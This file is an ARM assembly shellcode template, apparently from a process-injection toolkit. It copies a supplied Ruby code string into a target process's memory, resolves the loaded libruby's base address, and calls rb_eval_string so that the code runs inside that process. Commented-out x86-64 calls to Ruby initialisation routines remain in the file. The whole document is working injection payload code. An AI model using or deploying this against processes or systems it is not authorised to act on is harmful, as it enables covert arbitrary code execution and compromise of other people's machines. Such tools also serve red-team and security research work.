b execute_ruby_code_main

// import reusable code fragments
[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

execute_ruby_code_main:
// load a pointer to the Ruby code
	mov r0, pc
	b load_destination_address

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"
	.balign 4

load_destination_address:
	// r0 (source) is already set to code address
	ldr r7, [pc] 	@ Set r7 to the base read/write memory address
	b copy_code_to_rw_memory

read_write_address:
	.word [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	.balign 4

copy_code_to_rw_memory:
	// Set r1 (destination) to the base read/write memory address
	mov r1, r7
	// Add 0x80 to save some space to work with before the variable-length string
	add r1, r1, #0x80
	mov r2, #[VARIABLE:rubycode.length:VARIABLE]
	add r2, r2, #0x1	@ null terminator
	push {r7}
	bl asminject_copy_bytes
	pop {r7}

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

// get the base address of the Ruby library
// (will be persisted in r9 throughout the remainder of this payload)
	ldr r9, [pc]
	b load_rb_eval_string_offset

base_address:
	.word [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS]
	.balign 4

	# // BEGIN: call ruby_sysinit
	# push rbx
	# lea rax, ruby_argv[rip]	# fake argv data
	# lea rdx, ruby_argc[rip]	# fake argc data
	# mov rsi, rdx
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_sysinit:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_sysinit
	
	# // BEGIN: call ruby_init_stack
	# push rbx
	# lea rax, [RBP - 8]
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_stack:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init_stack
	
	# // BEGIN: call ruby_init
	# push rbx
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init
	
	# // BEGIN: call ruby_init_loadpath
	# push rbx
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_loadpath:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init_loadpath
	
// BEGIN: call rb_eval_string
// get the offset of the rb_eval_string function
load_rb_eval_string_offset:
	ldr r8, [pc]
	b call_rb_eval_string

rb_eval_string_offset:
	.word [RELATIVEOFFSET:rb_eval_string:RELATIVEOFFSET]
	.balign 4

call_rb_eval_string:
	mov r0, r7
	add r0, r0, #0x80
	add r6, r9, r8
	push {r7}
	push {r8}
	push {r9}
	blx r6
	pop {r9}
	pop {r8}
	pop {r7}
	// store handle in read/write memory
	str r0, [r7]
// END: call rb_eval_string
		
	# // BEGIN: call ruby_cleanup
	# push rbx
	# mov rdi, 0
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_cleanup:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_cleanup
	
	#mov rax, 0

SHELLCODE_SECTION_DELIMITER

